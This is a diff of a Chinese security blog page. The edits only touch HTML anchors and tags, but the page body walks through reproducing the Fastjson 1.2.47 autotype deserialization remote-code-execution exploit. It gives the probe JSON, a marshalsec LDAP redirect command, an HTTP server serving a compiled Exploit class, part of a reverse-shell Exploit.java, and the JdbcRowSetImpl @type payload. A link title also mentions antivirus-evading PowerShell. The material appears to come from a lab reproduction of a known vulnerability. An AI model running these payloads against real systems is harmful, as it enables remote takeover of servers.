@@ -265,18 +265,18 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2 id="Fastjson是什么"><a href="#Fastjson是什么" class="headerlink" title="Fastjson是什么"></a>Fastjson是什么</h2><ul>
+    <h2><span id="fastjson是什么">Fastjson是什么</span></h2><ul>
 <li><p><strong>Fastjson</strong>是阿里巴巴开源JSON解析库，他可以解析JSON格式的字符串。支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
 </li>
 <li><p><strong>Fastjson</strong>提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题。</p>
 </li>
 </ul>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
+<h2><span id="复现">复现</span></h2><h3><span id="复现环境">复现环境</span></h3><ul>
 <li>靶机  ：192.168.30.51</li>
 <li>攻击机：192.168.30.16</li>
 </ul>
 <p>RCE：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
-<h3 id="探测能否利用"><a href="#探测能否利用" class="headerlink" title="探测能否利用"></a>探测能否利用</h3><p>payload：</p>
+<h3><span id="探测能否利用">探测能否利用</span></h3><p>payload：</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span>
     <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"menghao"</span><span class="token punctuation">,</span>
     <span class="token string">"age"</span><span class="token punctuation">:</span><span class="token number">12</span>
@@ -290,13 +290,13 @@
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/images/15/2.png" alt></p>
-<h3 id="准备LDAP服务"><a href="#准备LDAP服务" class="headerlink" title="准备LDAP服务"></a>准备LDAP服务</h3><p><strong>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下</strong><br>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
+<h3><span id="准备ldap服务">准备LDAP服务</span></h3><p><strong>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下</strong><br>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
 <pre class="line-numbers language-java"><code class="language-java">java <span class="token operator">-</span>cp marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>LDAPRefServer http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">30.16</span><span class="token operator">:</span><span class="token number">1111</span><span class="token operator">/</span>#Exploit <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/15/3.png" alt></p>
-<h3 id="准备Web服务"><a href="#准备Web服务" class="headerlink" title="准备Web服务"></a>准备Web服务</h3><p>在当前目录下使用python搭建Web服务</p>
+<h3><span id="准备web服务">准备Web服务</span></h3><p>在当前目录下使用python搭建Web服务</p>
 <pre class="line-numbers language-java"><code class="language-java">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">1111</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/15/4.png" alt></p>
-<h3 id="修改Exploit并编译成class文件"><a href="#修改Exploit并编译成class文件" class="headerlink" title="修改Exploit并编译成class文件"></a>修改Exploit并编译成class文件</h3><p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）</p>
+<h3><span id="修改exploit并编译成class文件">修改Exploit并编译成class文件</span></h3><p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）</p>
 <p>Exploit.java</p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span>
 <span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span>
@@ -326,7 +326,7 @@
 <p>编译Exploit.java</p>
 <pre class="line-numbers language-java"><code class="language-java">javac Exploit<span class="token punctuation">.</span>java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/images/15/6.png" alt></p>
-<h3 id="使用EXP获取Shell"><a href="#使用EXP获取Shell" class="headerlink" title="使用EXP获取Shell"></a>使用EXP获取Shell</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>
+<h3><span id="使用exp获取shell">使用EXP获取Shell</span></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>
     <span class="token string">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
         <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
         <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
@@ -339,7 +339,7 @@
 
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>静等shell<del>~</del>(复现时虚拟机ping不通物理机时关闭本机防火墙即可)<br><img src="/images/15/7.png" alt><br><img src="/images/15/8.png" alt></p>
-<h3 id="Burp-自动探测Fastjson反序列化-脚本"><a href="#Burp-自动探测Fastjson反序列化-脚本" class="headerlink" title="Burp 自动探测Fastjson反序列化 脚本"></a>Burp 自动探测Fastjson反序列化 脚本</h3><p><a href="https://github.com/Maskhe/FastjsonScan" target="_blank" rel="noopener">https://github.com/Maskhe/FastjsonScan</a></p>
+<h3><span id="burp-自动探测fastjson反序列化-脚本">Burp 自动探测Fastjson反序列化 脚本</span></h3><p><a href="https://github.com/Maskhe/FastjsonScan" target="_blank" rel="noopener">https://github.com/Maskhe/FastjsonScan</a></p>
 <p>在平时抓包时右键 Send FastjsonScan 即可探测是否存在。<br><img src="/images/15/9.png" alt></p>
 
     
@@ -443,7 +443,7 @@
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          内网渗透-PowerShell免杀制作[过火绒，360和Windows Defender]
+          内网渗透-PowerShell免杀制作(过火绒，360和Windows Defender)
         
       </div>
     </a>
@@ -477,7 +477,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson是什么"><span class="toc-number">1.</span> <span class="toc-text">Fastjson是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现环境"><span class="toc-number">2.1.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#探测能否利用"><span class="toc-number">2.2.</span> <span class="toc-text">探测能否利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#准备LDAP服务"><span class="toc-number">2.3.</span> <span class="toc-text">准备LDAP服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#准备Web服务"><span class="toc-number">2.4.</span> <span class="toc-text">准备Web服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改Exploit并编译成class文件"><span class="toc-number">2.5.</span> <span class="toc-text">修改Exploit并编译成class文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用EXP获取Shell"><span class="toc-number">2.6.</span> <span class="toc-text">使用EXP获取Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Burp-自动探测Fastjson反序列化-脚本"><span class="toc-number">2.7.</span> <span class="toc-text">Burp 自动探测Fastjson反序列化 脚本</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">Fastjson是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.1.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.2.</span> <span class="toc-text">探测能否利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.3.</span> <span class="toc-text">准备LDAP服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.4.</span> <span class="toc-text">准备Web服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.5.</span> <span class="toc-text">修改Exploit并编译成class文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.6.</span> <span class="toc-text">使用EXP获取Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.7.</span> <span class="toc-text">Burp 自动探测Fastjson反序列化 脚本</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -617,6 +617,10 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
@@ -625,11 +629,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">免杀</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -637,19 +641,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
               </li>
              
               <li class="article-tag-list-item">
